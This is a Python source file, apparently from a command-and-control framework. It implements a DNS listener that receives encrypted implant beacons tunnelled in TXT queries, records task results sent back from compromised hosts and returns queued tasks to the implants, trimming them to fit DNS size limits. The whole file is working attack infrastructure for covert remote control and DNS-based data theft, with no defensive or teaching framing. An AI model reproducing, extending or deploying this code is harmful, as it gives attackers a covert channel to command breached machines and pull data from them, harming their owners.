"""DNS listener: tunnels implant beacons over TXT record queries."""

from __future__ import annotations

import base64
import logging
import threading
from typing import Optional, Dict

from dnslib import RR, TXT, QTYPE
from dnslib.server import BaseResolver, DNSServer, DNSLogger

from .base import BaseListener
from ..crypto.aes_gcm import encrypt, decrypt
from ..protocol.beacon import decode_beacon, encode_response, BeaconResponse
from ..models.session import get_session, list_sessions, update_last_seen
from ..models.task import get_pending_tasks, get_task, mark_sent, store_result

logger = logging.getLogger(__name__)

# Maximum bytes per TXT string (RFC 1035 §3.3: 255 octets per character-string).
_TXT_CHUNK = 255

# Label used to identify an empty/initial beacon with no payload.
_EMPTY_BEACON_LABEL = b"beacon"

# Maximum number of sessions to trial-decrypt against before giving up.
_MAX_TRIAL_DECRYPTS = 50

# DNS UDP responses should stay well under 512 bytes; use 400 as a safe limit.
_MAX_DNS_RESPONSE_BYTES = 400


def _b32_encode(data: bytes) -> bytes:
    """Base32-encode without padding (uppercase)."""
    return base64.b32encode(data).rstrip(b"=")


def _b32_decode(data: bytes) -> bytes:
    """Base32-decode data that may be missing padding."""
    padding = (-len(data)) % 8
    return base64.b32decode(data.upper() + b"=" * padding)


def _split_chunks(data: bytes, size: int) -> list[bytes]:
    """Split *data* into chunks of at most *size* bytes."""
    return [data[i : i + size] for i in range(0, len(data), size)]


class _ImplantResolver(BaseResolver):
    """dnslib resolver that handles beacon TXT queries.

    Query wire format
    -----------------
    ``<4hex_seq>.<base32_labels...>.<domain>``

    The sequence label (``<4hex_seq>``) is stripped.
    The trailing domain labels are stripped.
    The remaining labels are joined and base32-decoded to yield the AES-GCM
    ciphertext.  An empty payload beacon uses the sentinel label ``beacon``
    (``00.beacon.<domain>``).

    Response wire format
    --------------------
    The AES-GCM-encrypted BeaconResponse is base32-encoded and split into
    TXT strings of up to 255 bytes each, packed into a single TXT RR.
    """

    def __init__(self, domain: str, dns_listener: "DNSListener") -> None:
        # Normalise: lowercase, strip trailing dot.
        self._domain = domain.lower().rstrip(".")
        self._domain_labels = self._domain.split(".")
        self._listener = dns_listener
        # session_id -> session_key cache to avoid repeated trial decryption.
        self._session_keys: Dict[str, bytes] = {}
        self._lock = threading.Lock()

    def resolve(self, request, handler):
        reply = request.reply()

        # Only handle TXT queries.
        qname = str(request.q.qname).lower().rstrip(".")
        qtype = request.q.qtype

        if qtype != QTYPE.TXT:
            return reply

        try:
            txt_data = self._process_query(qname)
        except Exception as exc:
            logger.error("DNS resolver error for %r: %s", qname, exc)
            return reply

        if txt_data:
            # Each TXT RR can hold multiple character-strings; split to <=255 B each.
            chunks = _split_chunks(txt_data, _TXT_CHUNK)
            reply.add_answer(
                RR(
                    rname=request.q.qname,
                    rtype=QTYPE.TXT,
                    rdata=TXT(chunks),
                    ttl=60,
                )
            )

        return reply

    def _process_query(self, qname: str) -> Optional[bytes]:
        """Decode the beacon, process it, and return the encrypted response bytes."""
        labels = qname.split(".")

        # Must have at least: seq_label + domain_labels (>=2 labels for domain).
        domain_label_count = len(self._domain_labels)
        if len(labels) <= domain_label_count:
            logger.debug("DNS query too short to be a beacon: %r", qname)
            return None

        # Verify the suffix matches our domain.
        suffix = labels[-domain_label_count:]
        if suffix != self._domain_labels:
            logger.debug("DNS query domain mismatch: %r vs %r", suffix, self._domain_labels)
            return None

        # Strip domain suffix and the leading sequence label.
        payload_labels = labels[1:-domain_label_count]  # index 0 is seq_label

        # Empty beacon: single label "beacon" means no encrypted payload.
        if len(payload_labels) == 1 and payload_labels[0].lower().encode() == _EMPTY_BEACON_LABEL:
            return self._handle_empty_beacon()

        # Join and base32-decode the payload labels.
        encoded = b"".join(label.upper().encode() for label in payload_labels)
        try:
            ciphertext = _b32_decode(encoded)
        except Exception as exc:
            logger.warning("base32 decode failed for beacon payload: %s", exc)
            return None

        return self._handle_encrypted_beacon(ciphertext)

    def _handle_empty_beacon(self) -> Optional[bytes]:
        """Return an empty-task response for a no-payload beacon."""
        logger.debug("empty DNS beacon received")
        # No session context; return an empty response encrypted with... nothing.
        # An empty beacon cannot be attributed to a session without a key,
        # so we return an empty body (the implant will retry with a real beacon).
        return None

    def _handle_encrypted_beacon(self, ciphertext: bytes) -> Optional[bytes]:
        """Decrypt, process, and re-encrypt the beacon response."""
        session_id, session_key = self._resolve_session(ciphertext)
        if session_id is None or session_key is None:
            logger.warning("DNS beacon from unknown session (no matching key)")
            return None

        try:
            plaintext = decrypt(session_key, ciphertext)
        except Exception as exc:
            logger.warning("AES-GCM decrypt failed for DNS beacon: %s", exc)
            return None

        try:
            beacon = decode_beacon(plaintext)
        except Exception as exc:
            logger.warning("beacon decode error: %s", exc)
            return None

        try:
            update_last_seen(session_id)
        except Exception as exc:
            logger.error("update_last_seen failed for session %s: %s", session_id, exc)

        # Store results from beacon (with task ownership validation).
        for result in getattr(beacon, "results", []) or []:
            try:
                task_id = result.get("id", "")
                if not task_id:
                    continue
                # Validate task belongs to this session.
                task = None
                try:
                    task = get_task(task_id)
                except Exception:
                    pass
                if task is None or task.session_id != session_id:
                    logger.warning(
                        "result for task %s rejected: not owned by session %s",
                        task_id, session_id,
                    )
                    continue
                output_raw = result.get("output")
                # Go's encoding/json base64-encodes []byte fields.
                if isinstance(output_raw, str):
                    try:
                        output_bytes = base64.b64decode(output_raw)
                    except Exception:
                        output_bytes = output_raw.encode("utf-8")
                else:
                    output_bytes = output_raw
                store_result(
                    task_id=task_id,
                    session_id=session_id,
                    output=output_bytes,
                    error=result.get("error"),
                )
            except Exception as exc:
                logger.error("store_result failed: %s", exc)

        # Fetch pending tasks.
        try:
            pending = get_pending_tasks(session_id)
        except Exception as exc:
            logger.error("get_pending_tasks failed for session %s: %s", session_id, exc)
            pending = []

        tasks_payload = []
        for task in pending:
            tasks_payload.append({"id": task.id, "type": task.type, "args": task.args})

        session = get_session(session_id)
        sleep_interval = session.sleep_interval if session else 30
        jitter = session.jitter if session else 0.2
        shutdown = session.status == "dead" if session else False

        response_obj = BeaconResponse(
            tasks=tasks_payload,
            sleep_interval=sleep_interval,
            jitter=jitter,
            shutdown=shutdown,
        )

        try:
            response_bytes = encode_response(response_obj)
            encrypted = encrypt(session_key, response_bytes)
            encoded = _b32_encode(encrypted)

            # DNS UDP responses must stay under 512 bytes; use 400 as safe limit.
            # If over limit, progressively drop tasks until the response fits.
            while len(encoded) > _MAX_DNS_RESPONSE_BYTES and tasks_payload:
                tasks_payload = tasks_payload[:-1]
                response_obj = BeaconResponse(
                    tasks=tasks_payload,
                    sleep_interval=sleep_interval,
                    jitter=jitter,
                    shutdown=shutdown,
                )
                response_bytes = encode_response(response_obj)
                encrypted = encrypt(session_key, response_bytes)
                encoded = _b32_encode(encrypted)

            if len(encoded) > _MAX_DNS_RESPONSE_BYTES:
                # Even an empty task list is too large; send bare response.
                response_obj = BeaconResponse(
                    tasks=[],
                    sleep_interval=sleep_interval,
                    jitter=jitter,
                    shutdown=shutdown,
                )
                response_bytes = encode_response(response_obj)
                encrypted = encrypt(session_key, response_bytes)
                encoded = _b32_encode(encrypted)
                logger.warning(
                    "DNS response for session %s still large (%d bytes) after truncation",
                    session_id,
                    len(encoded),
                )
        except Exception as exc:
            logger.error("encode/encrypt response failed: %s", exc)
            return None

        # Mark tasks sent only AFTER successful encryption so tasks are not
        # permanently lost if encryption fails. Only mark tasks that were
        # actually included in the final (possibly truncated) response.
        sent_task_ids = {t["id"] for t in tasks_payload}

        for task in pending:
            if task.id in sent_task_ids:
                try:
                    mark_sent(task.id)
                except Exception as exc:
                    logger.error("mark_sent failed for task %s: %s", task.id, exc)

        return encoded

    def _resolve_session(
        self, ciphertext: bytes
    ) -> tuple[Optional[str], Optional[bytes]]:
        """Find the session whose key decrypts the ciphertext.

        First checks the in-memory session key cache.  On cache miss, falls
        back to iterating active sessions (capped at _MAX_TRIAL_DECRYPTS to
        prevent brute-force DoS).  Successful lookups are cached for future
        requests.
        """
        # Check the cache first.
        with self._lock:
            cached_items = list(self._session_keys.items())

        for sid, key in cached_items:
            try:
                decrypt(key, ciphertext)
                return sid, key
            except Exception:
                continue

        # Cache miss: trial-decrypt against active sessions (capped).
        try:
            sessions = list_sessions(status="active")
        except Exception as exc:
            logger.error("list_sessions failed: %s", exc)
            return None, None

        for session in sessions[:_MAX_TRIAL_DECRYPTS]:
            if not session.session_key:
                continue
            # Skip if already tried via cache above.
            with self._lock:
                if session.id in self._session_keys:
                    continue
            try:
                decrypt(session.session_key, ciphertext)
                # Cache on success.
                with self._lock:
                    self._session_keys[session.id] = session.session_key
                return session.id, session.session_key
            except Exception:
                continue

        return None, None


class _SilentDNSLogger(DNSLogger):
    """Suppress dnslib's default stdout logging; route through Python logging."""

    def log_pass(self, *args) -> None:
        pass

    def log_prefix(self, handler) -> str:
        return ""

    def log_recv(self, handler, data) -> None:
        logger.debug("DNS recv %d bytes from %s", len(data), handler.client_address)

    def log_send(self, handler, data) -> None:
        logger.debug("DNS send %d bytes to %s", len(data), handler.client_address)

    def log_request(self, handler, request) -> None:
        logger.debug("DNS request: %s", request.q.qname)

    def log_reply(self, handler, reply) -> None:
        logger.debug("DNS reply: %s answers", len(reply.rr))

    def log_truncated(self, handler, reply) -> None:
        logger.warning("DNS reply truncated for %s", handler.client_address)

    def log_error(self, handler, e) -> None:
        logger.error("DNS handler error: %s", e)


class DNSListener(BaseListener):
    """DNS-over-UDP listener that tunnels beacons in TXT record queries.

    Query format
    ------------
    ``<4hex_seq>.<base32_labels...>.<domain>``

    where *domain* is the configured apex (e.g. ``c2.example.com``).
    An empty beacon uses the sentinel ``00.beacon.<domain>``.

    The listener binds UDP (and optionally TCP) on the configured address/port
    and runs dnslib's DNSServer in a background daemon thread.
    """

    listener_type: str = "dns"

    def __init__(
        self,
        domain: str,
        bind_address: str = "0.0.0.0",
        port: int = 53,
        tcp: bool = False,
    ) -> None:
        super().__init__(bind_address, port)
        self.domain = domain
        self.tcp = tcp

        self._resolver = _ImplantResolver(domain=domain, dns_listener=self)
        self._dns_server: Optional[DNSServer] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        """Start the DNS server in a background daemon thread."""
        if self._running:
            logger.warning(
                "DNSListener already running on %s:%d", self.bind_address, self.port
            )
            return

        dns_logger = _SilentDNSLogger()
        self._dns_server = DNSServer(
            resolver=self._resolver,
            address=self.bind_address,
            port=self.port,
            tcp=self.tcp,
            logger=dns_logger,
        )

        self._thread = threading.Thread(
            target=self._dns_server.start,
            daemon=True,
            name=f"dns-listener-{self.port}",
        )
        self._thread.start()
        self._running = True
        logger.info(
            "DNSListener started on %s:%d (domain=%s, tcp=%s)",
            self.bind_address,
            self.port,
            self.domain,
            self.tcp,
        )

    def stop(self) -> None:
        """Stop the DNS server and join the background thread."""
        if not self._running:
            return
        if self._dns_server is not None:
            try:
                self._dns_server.stop()
            except Exception as exc:
                logger.warning("error stopping DNS server: %s", exc)
        if self._thread is not None:
            self._thread.join(timeout=10)
        self._running = False
        logger.info("DNSListener stopped")
